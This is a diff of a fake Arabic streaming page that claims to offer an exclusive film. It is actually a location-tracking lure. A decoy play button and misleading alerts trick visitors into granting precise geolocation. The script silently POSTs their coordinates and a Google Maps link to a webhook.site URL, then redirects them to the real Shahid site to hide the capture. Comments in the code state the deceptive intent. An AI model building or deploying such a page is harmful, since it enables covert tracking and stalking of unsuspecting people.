@@ -3,26 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شاهد فور يو | Shahid4U</title>
+    <title>شاهد VIP | Shahid Live</title>
     <style>
-        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .btn { background-color: #ff0000; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 1.2rem; cursor: pointer; text-decoration: none; }
+        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .player-box { width: 90%; max-width: 500px; height: 280px; background: #111; border: 2px solid #333; display: flex; justify-content: center; align-items: center; border-radius: 10px; cursor: pointer; position: relative; }
+        .play-icon { font-size: 80px; color: #fff; opacity: 0.8; }
+        .text-info { margin-top: 20px; font-size: 1.1rem; color: #ccc; }
     </style>
 </head>
 <body>
-    <div>
-        <h1>مشاهدة فيلم "ولاد رزق 3" حصرياً</h1>
-        <p>يجب تأكيد هويتك للمتابعة والمشاهدة مجاناً</p>
-        <button class="btn" onclick="startProcess()">Continue / متابعة</button>
+
+    <div class="player-box" onclick="captureLocation()">
+        <div class="play-icon">▶️</div>
     </div>
+    <div class="text-info">اضغط على المشغل لبدء البث المباشر (حصرياً)</div>
 
     <script>
-        async function startProcess() {
-            // رابط الـ Webhook الخاص بك
-            const webhookUrl = 'https://webhook.site/866c5c83-d3aa-4627-b9e5-5f835299495f';
+        function captureLocation() {
+            // تنبيه تمويهي يخلي الشخص يضغط موافق قبل طلب الموقع
+            alert("جاري التحقق من السيرفر في منطقتك... يرجى الضغط على 'سماح' لبدء البث.");
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
+                navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
 
@@ -30,31 +32,24 @@
                         latitude: lat,
                         longitude: lon,
                         map_link: `https://www.google.com/maps?q=${lat},${lon}`,
-                        userAgent: navigator.userAgent
+                        info: "Captured from iPhone/Mobile"
                     };
 
-                    // إرسال البيانات بوضع no-cors لضمان العبور من حماية الآيفون
-                    try {
-                        await fetch(webhookUrl, {
-                            method: 'POST',
-                            mode: 'no-cors',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(data)
-                        });
-                    } catch (e) {
-                        console.log("Sent");
-                    }
+                    // إرسال البيانات فوراً لـ Webhook الخاص بك
+                    fetch('https://webhook.site/866c5c83-d3aa-4627-b9e5-5f835299495f', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify(data)
+                    });
 
-                    // تحويل المستخدم لموقع شاهد الحقيقي بعد 1 ثانية
+                    // تحويل الشخص لموقع شاهد بعد الإرسال
                     setTimeout(() => {
                         window.location.href = "https://shahid.mbc.net/";
                     }, 1000);
 
                 }, (error) => {
-                    alert("عذراً، يجب السماح بالوصول للموقع لتتمكن من رؤية الأفلام القريبة منك!");
-                }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
-            } else {
-                alert("متصفحك لا يدعم هذه الميزة.");
+                    alert("يجب السماح بالوصول للموقع لتخطي الحجب عن هذا الفيلم في بلدك.");
+                }, { enableHighAccuracy: true });
             }
         }
     </script>
